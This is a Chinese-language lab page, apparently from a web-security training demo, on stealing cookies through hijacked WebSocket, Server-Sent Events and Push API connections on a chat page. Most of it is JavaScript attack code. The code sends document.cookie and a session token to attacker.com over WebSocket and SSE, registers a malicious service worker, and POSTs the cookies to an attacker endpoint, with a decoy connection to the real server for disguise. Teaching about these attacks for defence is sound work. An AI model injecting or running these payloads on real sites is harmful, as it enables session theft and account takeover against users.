😈 Case4 攻击：WebSocket/SSE Cookie 窃取

🎯 攻击原理

受害者在 case4-chat.html 页面中使用 WebSocket、EventSource (SSE) 或 Push API 建立连接时， 如果连接 URL 可以被攻击者控制，攻击者可以构造一个恶意 URL， 将连接指向自己的服务器，从而在连接建立时获取受害者的 cookie。

攻击流程：

  1. 攻击者准备一个恶意服务器，用于接收 WebSocket/SSE 连接
  2. 攻击者构造恶意 URL，指向自己的服务器
  3. 攻击者需要修改 case4-chat.html 中的连接 URL（实际攻击中可能通过 XSS 或其他方式）
  4. 当受害者访问 case4-chat.html 并建立连接时，连接会指向攻击者服务器
  5. 攻击者服务器从连接请求头中提取 cookie
  6. 攻击者在后台查看窃取的 cookie

💻 攻击代码展示

方式一：WebSocket 劫持

// 在受害者页面（case4-chat.html）中，如果 WebSocket URL 可以被控制：
// 原始代码（受害者）： const ws = new WebSocket(`ws://localhost:8080/ws?user=${userId}`);
// 攻击者修改后的代码： // 1. 先连接到攻击者服务器，发送 cookie const attackerWs = new WebSocket( `ws://attacker.com/steal?cookie=` + encodeURIComponent(document.cookie) );
attackerWs.onopen = () => { attackerWs.send(JSON.stringify({ caseId: 'case4', attackType: 'websocket_hijack', cookies: document.cookie, case4Token: document.cookie .split('; ') .find(c => c.startsWith('case4Token=')) ?.split('=')[1] })); };
// 2. 然后连接到正常服务器（可选，用于伪装） const ws = new WebSocket(`ws://localhost:8080/ws?user=${userId}`);

方式二：EventSource (SSE) 劫持

// 在受害者页面中，如果 EventSource URL 可以被控制：
// 原始代码（受害者）： const eventSource = new EventSource('/api/sse');
// 攻击者修改后的代码： // EventSource 会自动在请求头中携带 cookie（同源时） // 攻击者服务器可以从请求头中提取 cookie const attackerSSE = new EventSource( '/api/attacker/sse?cookie=' + encodeURIComponent(document.cookie) );
// 或者直接修改为攻击者服务器（需要 CORS 支持）： const attackerSSE = new EventSource( 'https://attacker.com/sse' );

方式三：Push API 劫持

// Push API 通常需要 Service Worker，攻击者可以注册恶意的 Service Worker：
// 1. 注册攻击者的 Service Worker navigator.serviceWorker.register('/attacker-sw.js') .then(registration => { // 2. 订阅推送，将订阅信息发送到攻击者服务器 return registration.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: attackerPublicKey }); }) .then(subscription => { // 3. 将订阅信息（包含 cookie）发送到攻击者服务器 fetch('/api/attacker/steal', { method: 'POST', body: JSON.stringify({ caseId: 'case4', attackType: 'push_hijack', cookies: document.cookie, subscription: subscription }) }); });
